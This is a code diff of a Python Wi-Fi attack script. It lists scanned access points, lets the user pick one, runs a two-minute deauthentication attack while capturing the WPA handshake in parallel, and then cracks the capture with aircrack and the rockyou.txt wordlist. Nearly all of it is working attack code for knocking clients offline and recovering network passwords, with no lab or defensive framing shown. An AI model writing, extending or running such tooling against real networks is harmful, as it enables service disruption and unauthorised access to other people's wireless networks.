@@ -40,53 +40,104 @@ d.enumAPs(interface = active_interface)
 wb = load_workbook("wifi_scan.xlsx")
 ws = wb["Access_Points"]
 
-ROCKYOU = "/usr/share/wordlists/rockyou.txt"
-
+# Parse all APs and store them in a list
+aps = []
 for row in ws.iter_rows(min_row=2, values_only=True):
     if not row or not row[0] or "BSSID" in str(row[0]):
         continue
     bssid = str(row[0]).strip()
-    channel = str(row[3]).strip()  # Adjust index if channel is in a different column
+    channel = str(row[3]).strip()
     ssid = str(row[13]).strip() if len(row) > 13 else "Unknown"
+    aps.append({
+        "bssid": bssid,
+        "channel": channel,
+        "ssid": ssid
+    })
 
-    print(f"\n[*] Targeting AP: {ssid} ({bssid}) on channel {channel}")
+# Display APs to user
+if len(aps) == 0:
+    print("[!] No access points found in scan.")
+    mon.stopMonitorMode()
+    exit(0)
 
-    stop_event = threading.Event()
-    duration = 120  # 2 minutes
-    deauth_thread = threading.Thread(target=deauth_attack, args=(bssid, active_interface, stop_event, duration))
-    deauth_thread.start()
+print("\n[*] Available Access Points:")
+for i, ap in enumerate(aps):
+    print(f"{i+1}. {ap['ssid']} ({ap['bssid']}) - Channel {ap['channel']}")
 
-    cap_file = capture_handshake(
+# Ask user to select an AP
+while True:
+    print("\n[?] Select an AP to target (enter number) or 0 to exit:")
+    try:
+        selection = int(input("[?] Selection: "))
+        if selection == 0:
+            print("[*] Exiting without attacking any AP.")
+            mon.stopMonitorMode()
+            active_interface = ifs.selectInterface()
+            print(ifs.getInterfaces())
+            exit(0)
+        if 1 <= selection <= len(aps):
+            break
+        else:
+            print(f"[!] Invalid selection. Please enter a number between 1 and {len(aps)}, or 0 to exit.")
+    except ValueError:
+        print("[!] Invalid input. Please enter a number.")
+
+# Get selected AP
+selected_ap = aps[selection - 1]
+bssid = selected_ap["bssid"]
+channel = selected_ap["channel"]
+ssid = selected_ap["ssid"]
+
+ROCKYOU = "/usr/share/wordlists/rockyou.txt"
+
+print(f"\n[*] Targeting AP: {ssid} ({bssid}) on channel {channel}")
+
+stop_event = threading.Event()
+duration = 120  # 2 minutes
+cap_file_holder = [None]  # Use list to store result from thread
+
+def capture_wrapper():
+    cap_file_holder[0] = capture_handshake(
         write_prefix=f"handshake_{ssid}",
         channel=channel,
         bssid=bssid,
         interface=active_interface,
-        stop_event=stop_event,  # allows capture to stop when deauth finishes
-        timeout=duration        # ensure capture also stops after duration if no handshake
+        stop_event=stop_event,
+        timeout=duration
     )
 
-    # If a handshake was captured, start cracking immediately in background
-    if cap_file:
-        # ensure rockyou exists
-        if os.path.exists(ROCKYOU):
-            aw = AircrackWrapper(cap_file, bssid, [ROCKYOU])
-            # pass duration as timeout so cracking will stop after same 5 minutes
-            cracker_thread = threading.Thread(target=aw.run_and_save, args=(ROCKYOU, duration))
-            cracker_thread.daemon = True
-            cracker_thread.start()
-            print("[*] Cracking started in background with rockyou.txt (timeout: {}s)".format(duration))
-        else:
-            print(f"[!] Wordlist not found: {ROCKYOU}. Skipping immediate cracking.")
+# Start both deauth and handshake capture in parallel
+deauth_thread = threading.Thread(target=deauth_attack, args=(bssid, active_interface, stop_event, duration))
+capture_thread = threading.Thread(target=capture_wrapper)
 
-    deauth_thread.join()
-    print(f"[*] Finished with {ssid} ({bssid})")
+deauth_thread.start()
+capture_thread.start()
+
+# Wait for both to complete (with timeout safety)
+deauth_thread.join(timeout=duration + 5)
+capture_thread.join(timeout=duration + 5)
+
+cap_file = cap_file_holder[0]
+
+# If a handshake was captured, start cracking immediately
+if cap_file:
+    # ensure rockyou exists
+    if os.path.exists(ROCKYOU):
+        aw = AircrackWrapper(cap_file, bssid, [ROCKYOU])
+        # pass duration as timeout so cracking will stop after same 2 minutes
+        cracker_thread = threading.Thread(target=aw.run_and_save, args=(ROCKYOU, duration))
+        cracker_thread.daemon = True
+        cracker_thread.start()
+        print("[*] Cracking started with rockyou.txt (timeout: {}s)".format(duration))
+    else:
+        print(f"[!] Wordlist not found: {ROCKYOU}. Skipping cracking.")
+
+print(f"[*] Finished with {ssid} ({bssid})")
 
 #stop monitor mode
 mon.stopMonitorMode()
 active_interface = ifs.selectInterface()
 print(ifs.getInterfaces())
-
-
 
 # Cleanup leftover handshake-* files
 _rm_cmd = "rm -v handshake*"
